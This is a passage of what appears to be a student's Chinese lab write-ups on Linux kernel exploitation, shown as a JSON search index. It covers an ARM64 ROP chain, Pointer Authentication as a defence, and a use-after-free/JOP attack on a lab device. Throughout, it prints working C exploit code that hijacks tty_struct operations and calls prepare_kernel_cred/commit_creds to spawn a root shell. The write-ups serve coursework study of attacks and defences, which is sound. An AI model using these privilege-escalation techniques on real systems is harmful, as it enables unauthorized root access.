zjubof_write2 ra\nbuf+160                     \u251c second_level_gadget\n...\n</code></pre> <p>\u8fd9\u6837\u5728 zjubof_write3 \u8fd4\u56de\u7684\u65f6\u5019\u5c31\u4f1a\u8df3\u8f6c\u5230 prepare_kernel_cred \u5904\uff0c\u540c\u7406\u6211\u4eec\u4e3a\u5b83\u8bbe\u7f6e\u597d\u4e86\u6808\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u51fd\u6570 prelude\uff0c\u7136\u540e\u6b63\u5e38\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u62b9\u6389\u8fd9\u4e2a\u5e27\u6808\u5e76\u8fd4\u56de\u5230\u6211\u4eec\u8bbe\u7f6e\u597d\u7684 commit_creds \u5904\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5230 second_level_gadget\uff0c\u8fd9\u91cc\u5728\u56de\u5230 zjubof_write \u524d\u540c\u7406\u4e5f\u9700\u8981\u8c03\u6574\u6808\uff0c\u6211\u4eec\u4e4b\u524d\u5c06 sp \u51cf\u4e86 0x220\uff0c\u8fd9\u91cc\u7684 prepare_kernel_cred \u548c commit_creds \u8fd4\u56de\u7684\u65f6\u5019\u5df2\u7ecf\u5206\u522b\u51cf\u5c11\u4e86 32 \u548c 48\uff0c\u6240\u4ee5 second_level_gadget \u4e2d\u53ea\u9700\u8981\u51cf\u5c11 0x220 - 32 - 48 = 0x1d0 \u5373\u53ef\u3002</p> <p>\u6309\u7167\u4e0a\u65b9\u7684\u5e27\u6808\u5206\u6790\u8fdb\u884c\u5e03\u5c40\u5373\u53ef\uff0c\u8fd9\u90e8\u5206\u7684 exp \u5982\u4e0b\uff1a</p> <pre><code>size_t first_level_gadget = 0xffff8000107abd7c;     // \u53bb\u9664\u4e86 prelude\nsize_t prepare_kernel_cred = 0xffff8000100a6214;    // \u53bb\u9664\u4e86 prelude\nsize_t commit_creds = 0xffff8000100a5f6c;           // \u53bb\u9664\u4e86 prelude\nsize_t second_level_gadget = 0xffff8000107abdb0;    // \u53bb\u9664\u4e86 prelude\nsize_t final_ra = 0xffff8000107abe54;\n\nvoid task3(int fd) {\n    char buf[0x200] = {0};\n    struct uint64_mem ra1, ra2, ra3, ra4;\n    ra1.val = prepare_kernel_cred + offset;\n    ra2.val = commit_creds + offset;\n    ra3.val = second_level_gadget + offset;\n    ra4.val = final_ra + offset;\n    memcpy(buf + 24, canary.buf, 8);\n    memcpy(buf + 40, ra1.buf, 8);\n    memcpy(buf + 72, ra2.buf, 8);\n    memcpy(buf + 104, ra3.buf, 8);\n    memcpy(buf + 152, ra4.buf, 8);\n    write(fd, buf, 160);\n    system(\"/bin/sh\");\n}\n</code></pre> <p>\u540c\u6837\u8fd0\u884c\uff0c\u5373\u53ef\u8fdb\u884c\u63d0\u6743\uff1a</p>"},{"location":"sec/syssec/lab2/#task-4","title":"Task 4","text":"<p>\u542f\u7528 ARMv8.3 PA \u4e4b\u540e\u7f16\u8bd1\u5185\u6838\uff0c\u5e76\u540c\u6837\u8fd0\u884c\uff0c\u4fee\u6539 exp \u4e2d\u5df2\u77e5\u5730\u5740\u540e\u8fd0\u884c exp \u4ecd\u51fa\u73b0\u6bb5\u9519\u8bef\uff1a</p> <p>\u89c2\u5bdf zjubof_write3 \u7684\u6c47\u7f16\uff1a</p> <pre><code>ffff800010eb6ccc &lt;zjubof_write3&gt;:\nffff800010eb6ccc:   d503245f    hint    #0x22\nffff800010eb6cd0:   d503233f    paciasp\nffff800010eb6cd4:   a9be7bfd    stp x29, x30, [sp, #-32]!\nffff800010eb6cd8:   910003fd    mov x29, sp\nffff800010eb6cdc:   a90153f3    stp x19, x20, [sp, #16]\nffff800010eb6ce0:   aa0003f3    mov x19, x0\nffff800010eb6ce4:   aa0103f4    mov x20, x1\nffff800010eb6ce8:   f0003720    adrp    x0, ffff80001159d000 &lt;kallsyms_token_index+0xd7298&gt;\nffff800010eb6cec:   91188000    add x0, x0, #0x620\nffff800010eb6cf0:   97ffe556    bl  ffff800010eb0248 &lt;_printk&gt;\nffff800010eb6cf4:   aa1403e1    mov x1, x20\nffff800010eb6cf8:   aa1303e0    mov x0, x19\nffff800010eb6cfc:   97ffffc7    bl  ffff800010eb6c18 &lt;zjubof_write4&gt;\nffff800010eb6d00:   d2800000    mov x0, #0x0                    // #0\nffff800010eb6d04:   a94153f3    ldp x19, x20, [sp, #16]\nffff800010eb6d08:   a8c27bfd    ldp x29, x30, [sp], #32\nffff800010eb6d0c:   d50323bf    autiasp\nffff800010eb6d10:   d65f03c0    ret\n</code></pre> <p>hint \u6307\u4ee4\u53ef\u4ee5\u5ffd\u7565\uff0c\u6240\u4ee5\u672c\u8d28\u4e0a\u5176\u591a\u4e86 paciasp \u548c autiasp \u4e24\u6761\u6307\u4ee4\u3002\u8fd9\u4e24\u6761\u6307\u4ee4\u7531 ARMv8.3 \u7684 Pointer Authentication \u673a\u5236\u5f15\u5165\uff0c\u539f\u7406\u662f\u5728\u5b58\u50a8\u6307\u9488\u65f6\u5728\u5730\u5740\u9ad8\u4f4d\u6dfb\u52a0\u7b7e\u540d\uff0c\u4f7f\u5f97\u6808\u4e0a\u5b58\u50a8\u7684\u8fd4\u56de\u5730\u5740\u4e0d\u662f\u88f8\u7684\u8fd4\u56de\u5730\u5740\uff0c\u800c\u662f\u5e26\u6709\u7b7e\u540d\u7684\u8fd4\u56de\u5730\u5740\u3002\u56e0\u6b64\u4e5f\u53ef\u89c1\u5728 leak_info \u51fd\u6570\u7684\u8f93\u51fa\u4e2d ra \u7684\u503c\u5e76\u975e\u4e3a 0xfff \u5f00\u5934\u7684\u865a\u62df\u5730\u5740\uff0c\u800c\u662f 0x4ad... \u8fd9\u6837\u7684\u5730\u5740\u3002</p> <p>paciasp \u6307\u4ee4\u4f1a\u4e3a\u5f53\u524d\u8fd4\u56de\u5730\u5740\u6dfb\u52a0 PAC \u7b7e\u540d\uff0c\u4e4b\u540e\u518d\u901a\u8fc7 stp \u5b58\u5165\u6808\u4e0a\u3002\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u901a\u8fc7 autiasp \u6307\u4ee4\u9a8c\u8bc1\u8fd4\u56de\u5730\u5740\u7684 PAC \u7b7e\u540d\u5e76\u6062\u590d\u4e3a\u88f8\u7684\u8fd4\u56de\u5730\u5740\u3002\u8fd9\u4e5f\u5c31\u4f7f\u5f97\u4e86\u4e2d\u95f4\u5bf9\u4e8e ra \u7684\u4fee\u6539\u4f1a\u4f7f\u5f97 autiasp \u9a8c\u8bc1\u65e0\u6548\u4ece\u800c\u629b\u51fa\u5f02\u5e38\u3002\u4e5f\u4f7f\u5f97\u4e86\u901a\u8fc7\u4fee\u6539\u8fd4\u56de\u5730\u5740\u8fdb\u884c\u7684\u653b\u51fb\u66f4\u52a0\u56f0\u96be\u3002</p>"},{"location":"sec/syssec/lab2/#_3","title":"\u601d\u8003\u9898","text":"<ol> <li>\u4e3a\u4ec0\u4e48 Linux canary \u7684\u6700\u4f4e\u4f4d byte \u603b\u662f \\00\uff1f</li> </ol> <p>\u56e0\u4e3a canary \u503c\u4ee5\u5c0f\u7aef\u5e8f\u5b58\u5165\uff0c\u8fd9\u6837\u5728\u4f4e\u4f4d\u7684\u5730\u5740\u5c31\u662f \\x00\uff0c\u5982\u679c\u4e0b\u4e00\u4e2a\u51fd\u6570\u5e27\u6808\u7684\u6700\u9ad8\u4f4d\u5c40\u90e8\u53d8\u91cf\u662f\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u8fd9\u4e2a \\x00 \u5c31\u4f1a\u4fdd\u8bc1\u8be5\u5b57\u7b26\u4e32\u7684\u540e\u9762\u4e00\u5b9a\u6709\u4e00\u4e2a \\0\uff0c\u5982\u679c\u6253\u5370\u8be5\u5b57\u7b26\u4e32\u6216\u8005\u901a\u8fc7 strcpy \u8fdb\u884c\u62f7\u8d1d\u90fd\u4f1a\u505c\u6b62\u5728 canary \u524d\uff0c\u964d\u4f4e\u4e86 canary \u6cc4\u6f0f\u7684\u98ce\u9669\u3002\u4f46\u662f\u5bf9\u4e8e\u672c\u6b21\u5b9e\u9a8c\u4e2d\u901a\u8fc7 memcpy \u8fdb\u884c\u62f7\u8d1d\u662f\u6ca1\u6709\u4f5c\u7528\u7684\u3002</p> <ol> <li>\u5728 ARM64 \u7684 ROP \u4e2d\uff0c\u5728 zjubof_write4 \u4e2d overflow \u8986\u76d6\u5230\u7684\u8fd4\u56de\u5730\u5740\uff0c\u4f1a\u5728\u4ec0\u4e48\u65f6\u5019/\u6267\u884c\u5230\u54ea\u4e2a\u51fd\u6570\u54ea\u4e00\u884c\u7684\u65f6\u5019\u88ab load \u5230 pc \u5bc4\u5b58\u5668\uff1f</li> </ol> <p>\u5728 zjubof_write4 \u4e2d\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u4f1a\u5728 zjubof_write3 \u8fd4\u56de\u65f6\u4e5f\u5c31\u662f\u6700\u540e postlude \u4e2d ldp \u8bfb\u53d6\u4e86 x29 x30 \u540e\u901a\u8fc7 ret \u6307\u4ee4 load \u5230 pc \u5bc4\u5b58\u5668\uff1a</p> <pre><code>ffff800010de7c78 &lt;zjubof_write3&gt;:\n...\nffff800010de7ca8:   a94153f3    ldp x19, x20, [sp, #16]\nffff800010de7cac:   a8c27bfd    ldp x29, x30, [sp], #32\nffff800010de7cb0:   d65f03c0    ret\n</code></pre> <ol> <li>\u5728 Task 2 \u4e2d\uff0c\u4e3a\u4ec0\u4e48\u5728 exp \u4e2d\u76f4\u63a5\u8986\u76d6\u8fd4\u56de\u5730\u5740\u4e3a first_level_gadget \u7684\u6c47\u7f16\u7b2c\u4e00\u884c\u5730\u5740\uff0c\u4f1a\u9020\u6210 kernel \u5728\u8fd0\u884c\u5230\u8fd9\u4e00\u884c\u7684\u65f6\u5019\u4ea7\u751f panic\uff1f\u5e76\u5199\u51fa\u9020\u6210\u8fd9\u4e2a panic \u7684\u89e6\u53d1\u94fe\u3002</li> </ol> <p>\u5728\u8fd0\u884c first_level_gadget \u7b2c\u4e00\u6761\u6307\u4ee4\u524d\u7684\u6808\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>sp      old frame pointer   \u2510\nsp+08   return address      \u2502                  -&gt; to zjubof_write\nsp+16                       \u251c zjubof_write2\nsp+24                       \u2518\n</code></pre> <p>\u8fd9\u65f6\u7684\u6808\u5df2\u7ecf\u6062\u590d\u5230\u4e86 zjubof_write2 \u7684\u6808\u4e0a\uff0c\u8fd9\u91cc\u7684 ra \u662f\u9884\u671f\u7684 zjubof_write \u4e2d\u7684\u5730\u5740\u3002\u800c\u5982\u679c\u8fd9\u65f6\u8fd0\u884c first_level_gadget \u7684\u7b2c\u4e00\u884c\uff0c\u5c31\u4f1a\u6267\u884c stp x29, x30, [sp, #-16]! \u6307\u4ee4\uff0c\u5c06\u5f53\u524d\u7684 x29 x30 \u4fdd\u5b58\u5230 sp-16 \u7684\u4f4d\u7f6e\u5e76\u4e3a sp \u51cf 16\uff0c\u800c\u8fd9\u65f6\u5b58\u50a8\u7684 ra(x30) \u4ecd\u7136\u662f\u6211\u4eec\u4f2a\u9020\u7684 first_level_gadget \u7684\u5730\u5740\uff0c\u6240\u4ee5\u6808\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>sp      old frame pointer   \u2510\nsp+08   return address      \u2518                  -&gt; to first_level_gadget  \nsp+16   old frame pointer   \u2510\nsp+24   return address      \u2502                  -&gt; to zjubof_write\nsp+32                       \u251c zjubof_write2\nsp+40                       \u2518\n</code></pre> <p>\u8fd9\u6837\u5728 first_level_gadget \u4e2d\u4f1a sp-=0x220 \u8c03\u6574 sp \u540e\u7acb\u5373\u8fd4\u56de\u5230 ra \u5904\uff0c\u800c\u8fd9\u4e2a ra \u6070\u597d\u53c8\u662f first_level_gadget \u7b2c\u4e00\u884c\u3002\u6240\u4ee5\u4f1a\u8fd9\u6837\u4e0d\u65ad\u53cd\u590d\u8fdb\u5165 first_level_gadget\uff0c\u4e0d\u65ad\u5c06 sp \u51cf\u5c0f\uff0c\u76f4\u5230\u7206\u6808\u3002\u53ef\u4ee5\u9a8c\u8bc1\uff0c\u76f4\u63a5\u8986\u76d6\u4e3a\u7b2c\u4e00\u884c\u5730\u5740\u540e\u7684 panic \u4fe1\u606f\u5982\u4e0b\uff1a</p> <p>\u53ef\u89c1 task \u7684\u6808\u7a7a\u95f4\u4e3a [0xffff8000102d8000..0xffff8000102dc000] \u800c\u5f53\u524d sp \u4e3a 0xffff8000102dc170\uff0c\u5df2\u7ecf\u8d85\u51fa\u4e86\u6808\u7a7a\u95f4\uff0c\u800c\u5728\u5904\u7406\u5f02\u5e38\u7684\u65f6\u5019\u53c8\u56e0\u4e3a Insufficient stack space to handle exception! \u5bfc\u81f4\u4e86 kernel panic\u3002</p> <ol> <li>Linux \u5185\u6838\u662f\u5982\u4f55\u5229\u7528 ARM PA \u6765\u9632\u5fa1 ROP \u653b\u51fb\u7684</li> </ol> <p>Linux \u5185\u6838\u5229\u7528 ARM PA \u7684 paciasp \u548c autiasp \u6307\u4ee4\u6765\u5bf9\u8fd4\u56de\u5730\u5740\u8fdb\u884c\u7b7e\u540d\u548c\u9a8c\u8bc1\uff0c\u8fd9\u6837\u5728\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u65f6\u4f1a\u5c06\u5176\u7b7e\u540d\uff0c\u800c\u5728\u8fd4\u56de\u65f6\u4f1a\u9a8c\u8bc1\u7b7e\u540d\uff0c\u5982\u679c\u7b7e\u540d\u4e0d\u5339\u914d\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u8fd9\u6837\u5c31\u4f7f\u5f97\u4e86\u5728\u5185\u6838\u4e2d\u8fdb\u884c ROP \u653b\u51fb\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\uff0c\u8be6\u7ec6\u5206\u6790\u89c1 Task 4\u3002</p>"},{"location":"sec/syssec/lab3/","title":"Linux \u5185\u6838 JOP \u653b\u51fb\u4e0e\u9632\u62a4","text":"<p> \u7ea6 2836 \u4e2a\u5b57  169 \u884c\u4ee3\u7801  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u7cfb\u7edf\u5b89\u5168 lab3\uff08bonus\uff09\u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/syssec/lab3/#_1","title":"\u5b9e\u9a8c\u76ee\u6807","text":"<p>\u4e86\u89e3 UAF (Use-After-Free) \u7c7b\u578b\u7684\u6f0f\u6d1e\u4ee5\u53ca JOP (Jump-oriented programming) \u653b\u51fb\u539f\u7406\uff0c\u5e76\u5728\u6b64\u57fa\u7840\u4e0a\uff0c\u901a\u8fc7\u73b0\u6709\u7684 UAF \u6f0f\u6d1e\u548c JOP \u7f16\u7a0b\uff0c\u5b9e\u73b0\u83b7\u53d6 Linux \u5185\u6838\u7684 root \u6743\u9650\u7684 PoC (Proof of Concept)\uff0c\u5e76\u8bfb\u53d6\u4e00\u4e2a\u53ea\u6709 root \u6743\u9650\u4e0b\u53ef\u8bfb\u7684\u6587\u4ef6\uff0c\u83b7\u53d6 flag\u3002</p> <ul> <li>\u5229\u7528 gdb \u8c03\u8bd5\u5185\u6838\uff0c\u83b7\u53d6\u5185\u6838\u5173\u952e\u51fd\u6570\u548c gadget \u7684\u5730\u5740\uff1b</li> <li>\u4e86\u89e3 Linux \u8bbe\u5907\u63d0\u4f9b\u7684\u63a5\u53e3\u548c\u5176\u8c03\u7528\u903b\u8f91\uff0c\u5e76\u5c1d\u8bd5\u4f7f\u7528 Linux \u8bbe\u5907\u63a5\u53e3\u8fdb\u884c\u57fa\u7840\u7f16\u7a0b\uff0c\u4e86\u89e3 Linux \u5982\u4f55\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u7684\u65b9\u5f0f\u89e6\u53d1\u5185\u6838\u8bbe\u5907\u4e2d\u76f8\u5e94\u7684\u51fd\u6570\uff1b</li> <li>\u7406\u89e3 UAF \u6f0f\u6d1e\u539f\u7406\uff0c\u4ee5\u53ca\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\uff1b\u4f7f\u7528 gdb-multiarch \u5bf9\u6240\u63d0\u4f9b\u7684\u672a\u538b\u7f29\u7684\u5185\u6838 (vmlinux) \u8fdb\u884c\u8c03\u8bd5\uff0c\u67e5\u627e\u8bbe\u5907 UAF \u6f0f\u6d1e\u6240\u5728\u7684\u4f4d\u7f6e\u53ca\u89e6\u53d1\u6761\u4ef6\uff0c\u83b7\u53d6\u5185\u6838 tty_struct \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff0c\u5e76\u5229\u7528\u8bbe\u5907\u63a5\u53e3\u63a7\u5236\u8be5\u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff0c\u4e3a root \u5185\u6838\u505a\u51c6\u5907\uff1b</li> <li>\u4e86\u89e3 JOP \u653b\u51fb\u7684\u539f\u7406\uff0c\u5c1d\u8bd5\u5229\u7528\u8bbe\u5907\u63a5\u53e3\u89e6\u53d1 UAF \u6f0f\u6d1e\uff0c\u5e76\u631f\u6301\u63a7\u5236\u6d41\uff0c\u901a\u8fc7 JOP \u653b\u51fb\u7ed5\u8fc7 PXN \u673a\u5236\uff0c\u83b7\u53d6\u5185\u6838\u7684 root \u6743\u9650\uff1b</li> <li>\u5229\u7528\u63d0\u4f9b\u7684 gadget \u7247\u6bb5\uff0c\u6784\u9020 JOP \u653b\u51fb\u8df3\u8f6c\u94fe\uff0c\u83b7\u53d6 root \u6743\u9650\u7684 shell\u3002</li> </ul>"},{"location":"sec/syssec/lab3/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"sec/syssec/lab3/#task-1","title":"Task 1","text":"<p>\u56e0\u4e3a\u5728 zjudev \u8bbe\u5907\u4e2d\u53ea\u6709\u4e00\u4e2a zjudev \u7ed3\u6784\u4f53\uff0c\u5f00\u542f\u591a\u4e2a\u8bbe\u5907\u5176\u5b9e\u5728\u5171\u7528\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u56e0\u6b64\u5728\u5f00\u542f\u4e24\u4e2a zjudev \u8bbe\u5907\u540e free \u6389\u5176\u4e2d\u4e00\u4e2a\uff0c\u5219\u53e6\u4e00\u4e2a zjudev \u8bbe\u5907\u7684 dev_buf \u6307\u9488\u503c\u4ecd\u7136\u4fdd\u7559\uff0c\u5b58\u5728 UAF \u6f0f\u6d1e\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u521b\u5efa\u4e24\u4e2a zjudev \u8bbe\u5907\uff0c\u7136\u540e\u5229\u7528\u4e00\u4e2a\u8bbe\u5907\u5206\u914d\u4e00\u4e2a 0x2B8 \u5927\u5c0f\u7684\u5806\uff0c\u518d\u901a\u8fc7 close \u91ca\u653e\u6389\u8fd9\u4e2a\u5806\u3002\u63a5\u4e0b\u6765\u5f00\u542f ptmx \u8bbe\u5907\uff0c\u8fd9\u65f6\u6709\u6982\u7387\u4f1a\u5c06 ptmx \u7684 tty_struct \u7ed3\u6784\u4f53\u521b\u5efa\u5728\u4e4b\u524d free \u6389\u7684\u8bbe\u5907\u7684\u5806\u4e0a\uff0c\u800c\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u901a\u8fc7\u53e6\u4e00\u4e2a zjudev \u8bbe\u5907\u6765\u8fdb\u884c UAF \u8bfb\u53d6\u3002</p> <p>Question 2. \u5982\u4f55\u786e\u5b9a\u81ea\u5df1\u6240\u63a7\u5236\u7684\u6307\u9488\u4e00\u5b9a\u88ab\u5206\u914d\u7ed9 tty_struct \u7ed3\u6784\u4f53\uff1f</p> <p>\u56e0\u4e3a ptmx \u8bbe\u5907\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u5206\u914d tty_struct \u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7684\u5934\u56db\u5b57\u8282\u4e3a\u4e00\u4e2a int\uff0c\u8868\u793a magic\uff0c\u5f53 magic \u4e3a 0x5401 \u65f6\u65f6\uff0c\u8868\u793a\u8fd9\u4e2a\u7ed3\u6784\u4f53\u662f\u4e00\u4e2a tty_struct \u7ed3\u6784\u4f53\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 zjudev UAF \u8bfb\u53d6\uff0c\u5982\u679c\u5934\u56db\u5b57\u8282\u65f6 0x5401 \u7684\u8bdd\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u6240\u63a7\u5236\u7684\u6307\u9488\u662f tty_struct \u7ed3\u6784\u4f53\u3002\u5426\u5219\u4e0d\u662f\uff0c\u5219\u9700\u8981\u91cd\u65b0\u521b\u5efa ptmx \u8bbe\u5907\u3002</p> <p>\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>struct tty_struct {\n    int magic;\n    char rest[0x2B8 - 4];\n} tty_buf;\n\nint main() {\n    int dev_fd1 = open(\"/dev/zjudev\", O_RDWR);\n    int dev_fd = open(\"/dev/zjudev\", O_RDWR);\n    ioctl(dev_fd1, 0x0001, 0x2B8);\n    close(dev_fd1);\n    int ptmx_fd;\n    while (1) {\n        ptmx_fd = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY);\n        memset(&amp;tty_buf, 0, sizeof(tty_buf));\n        read(dev_fd, &amp;tty_buf, 0x2B8 - 1);\n        printf(\"[*] tty_buf.magic: 0x%x\\n\", tty_buf.magic);\n        if (tty_buf.magic == 0x5401) {\n            break;\n        }\n        close(ptmx_fd);\n    }\n    printf(\"[+] ptmx_fd: %d\\n\", ptmx_fd);\n    close(ptmx_fd);\n    return 0;\n}\n</code></pre> <p>./qemu.sh \u542f\u52a8\u5185\u6838\u540e\uff0ccat &gt; exp.c \u5c06\u4e0a\u8ff0\u4ee3\u7801\u7c98\u8d34\u5199\u5165 exp.c \u6587\u4ef6\uff0c\u7136\u540e gcc exp.c -o exp \u7f16\u8bd1\u518d\u901a\u8fc7 ./exp \u8fd0\u884c\uff0c\u53ef\u89c1\u6211\u4eec\u53ef\u4ee5\u6210\u529f\u63a7\u5236\u5230 tty_struct \u7ed3\u6784\u4f53\uff1a</p>"},{"location":"sec/syssec/lab3/#task-2","title":"Task 2","text":"<p>tty_struct \u7ed3\u6784\u4f53\u4e2d\u6709 const struct tty_operations *ops \u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u7684 tty_operations \u7ed3\u6784\u4f53\u4e2d\u5305\u542b 36 \u4e2a\u51fd\u6570\u6307\u9488\uff0c\u6bcf\u4e2a\u51fd\u6570\u6307\u9488\u6307\u5411\u4e86\u4e00\u4e2a\u9488\u5bf9 ptmx \u8bbe\u5907\u8fdb\u884c\u64cd\u4f5c\u7684\u51fd\u6570\uff0c\u5176\u4e2d\u7b2c\u4e94\u4e2a\u51fd\u6570\u662f close\u3002\u6211\u4eec\u5728 Task 1 \u4e2d\u63a7\u5236 zjudev \u7684 buffer \u548c tty_struct \u6307\u5411\u4e86\u540c\u4e00\u4f4d\u7f6e\uff0c\u5e76\u4e14 zjudev \u53ef\u4ee5\u901a\u8fc7 write \u5bf9\u4e8e buffer \u8fdb\u884c\u5199\u5165\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8986\u76d6 ops \u6307\u9488\uff0c\u4f7f\u5176\u6307\u5411\u6211\u4eec\u81ea\u5df1\u7684\u4e00\u4e2a\u7ed3\u6784\u4f53\uff08\u56e0\u4e3a\u6ca1\u6709 SMAP \u4fdd\u62a4\uff0c\u6240\u4ee5\u5185\u6838\u53ef\u4ee5\u8bfb\u53d6\u7528\u6237\u6001\u6211\u4eec\u521b\u5efa\u7684\u7ed3\u6784\u4f53\uff09\uff0c\u5176\u4e2d\u7b2c\u4e94\u4e2a\u51fd\u6570\u6307\u9488\u7684\u4f4d\u7f6e\u5199\u4e3a hack_cred \u51fd\u6570\u7684\u5730\u5740\u3002\u8fd9\u6837\u5728\u8986\u76d6\u4e4b\u540e\u6211\u4eec close(ptmx) \u7684\u65f6\u5019\u5c31\u4f1a\u67e5\u627e\u5230 close \u51fd\u6570\u6307\u9488\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u8c03\u7528 hack_cred \u51fd\u6570\u8fdb\u884c\u63d0\u6743\u3002</p> <p>\u56e0\u4e3a\u6ca1\u6709\u5f00\u542f KASLR\uff0c\u6240\u4ee5 hack_cred \u7684\u5730\u5740\u53ef\u4ee5\u76f4\u63a5\u5728 System.map \u4e2d\u627e\u5230\uff1a</p> <pre><code>\u276f cat kernel/nocfi/System.map | grep hack_cred\nffff80001083aa84 T hack_cred\n</code></pre> <p>\u6240\u4ee5\u8fd9\u90e8\u5206\u7684\u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>size_t hack_cred_addr = 0xffff80001083aa84;\n\nstruct tty_operations {\n    char prefix[8 * 4];\n    void *close;\n    char rest[8 * 31];\n} hack_ops;\n\nstruct tty_struct {\n    int magic;\n    char kref_dev_driver_data[20];\n    struct tty_operations *ops;\n    char rest[0x2B8 - 32];\n} tty_buf, hack_buf;\n\nvoid task2(int dev_fd, int ptmx_fd) {\n    printf(\"[*] task2 hacking...\\n\");\n    memcpy(&amp;hack_buf, &amp;tty_buf, sizeof(tty_buf));\n    hack_ops.close = (void *)hack_cred_addr;\n    hack_buf.ops = &amp;hack_ops;\n    write(dev_fd, &amp;hack_buf, 32);\n    close(ptmx_fd);\n    system(\"/bin/sh\");\n    return;\n}\n</code></pre> <p>\u540c\u6837\u5728\u5185\u6838\u4e2d\u8fd0\u884c\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6210\u529f\u83b7\u53d6\u5230 root \u6743\u9650\u5e76\u8bfb\u53d6 flag \u6587\u4ef6\uff1a</p> <p>\u53ef\u4ee5\u53d1\u73b0\u5728\u8fdb\u5165 task2 \u51fd\u6570\u4e4b\u540e\uff0c\u6210\u529f\u8fdb\u884c\u4e86\u63d0\u6743\uff0c\u5e76\u5728 root \u6743\u9650\u4e0b\u8fdb\u5165\u4e86 shell\uff0c\u5f97\u5230 flag \u5185\u5bb9\u4e3a NzYyNDcyMzI5MTAy\u3002</p> <p>Question 3. \u4e3a\u4ec0\u4e48\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7 UAF \u63a7\u5236 cred \u7ed3\u6784\u4f53\u76f4\u63a5\u4fee\u6539\u5176\u5185\u5bb9\uff1f\u6709\u6ca1\u6709\u529e\u6cd5\u80fd\u591f\u901a\u8fc7 UAF \u6765\u5229\u7528\u65b0\u7248\u672c\u7684 cred \u7ed3\u6784\u4f53\u5462\uff1f</p> <p>\u56e0\u4e3a\u5728\u5185\u6838\u542f\u52a8\u65f6\uff0c\u8c03\u7528\u4e86 cred_init \u51fd\u6570\u5982\u4e0b\uff1a</p> <pre><code>/*\n * initialise the credentials stuff\n */\nvoid __init cred_init(void)\n{\n    /* allocate a slab in which we can store credentials */\n    cred_jar = kmem_cache_create(\"cred_jar\", sizeof(struct cred), 0,\n            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);\n}\n</code></pre> <p>\u7136\u540e\u5728 prepare_kernel_cred \u7684\u65f6\u5019\u4f1a\u521b\u5efa\u65b0\u7684 cred \u7ed3\u6784\u4f53\uff1a</p> <pre><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)\n{\n    const struct cred *old;\n    struct cred *new;\n\n    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);\n...\n</code></pre> <p>\u800c\u8fd9\u91cc\u7528\u7684\u662f kmem_cache_alloc \u51fd\u6570\uff0c\u5e76\u4ece cred_jar \u4e2d\u8fdb\u884c\u5206\u914d\uff0c\u800c\u8fd9\u4e2a cache \u5728\u521b\u5efa\u7684\u65f6\u5019\u5e26\u6709 SLAB_ACCOUNT \u6807\u8bb0\uff0c\u8868\u793a\u8fdb\u884c\u9694\u79bb\uff0c\u8fd9\u4e2a\u5806\u5757\u8981\u5355\u72ec\u5b58\u5728\u3002\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u4e0b alloc \u7684\u5185\u5b58\u4e0d\u4f1a\u548c kmalloc \u91ca\u653e\u6389\u7684\u91cd\u5408\uff0c\u56e0\u6b64\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 UAF \u6765\u63a7\u5236 cred \u7ed3\u6784\u4f53\u3002\u5e76\u4e14\u56e0\u4e3a cred \u7ed3\u6784\u4f53\u8fd8\u6709 cred_jar \u90fd\u5728\u5185\u6838\u6001\uff0c\u6240\u4ee5\u5728\u7528\u6237\u6001\u4e5f\u65e0\u6cd5\u5229\u7528 kmem_cache_alloc \u6765 UAF \u63a7\u5236 cred \u7ed3\u6784\u4f53\u3002</p>"},{"location":"sec/syssec/lab3/#task-3","title":"Task 3","text":"<p>\u76f4\u63a5\u901a\u8fc7 System.map \u83b7\u5f97 gadget \u5730\u5740\u4ee5\u53ca prepare_kernel_cred \u548c commit_creds \u5730\u5740\uff1a</p> <pre><code>\u276f cat kernel/nocfi/System.map | grep zju_gadget\nffff80001083aa44 T zju_gadget1\nffff80001083aa5c T zju_gadget2\nffff80001083aa74 T zju_gadget3\n\u276f cat kernel/nocfi/System.map | grep prepare_kernel_cred\nffff8000100b6030 T prepare_kernel_cred\n...\n\u276f cat kernel/nocfi/System.map | grep commit_creds\nffff8000100b5bac T commit_creds\n...\n</code></pre> 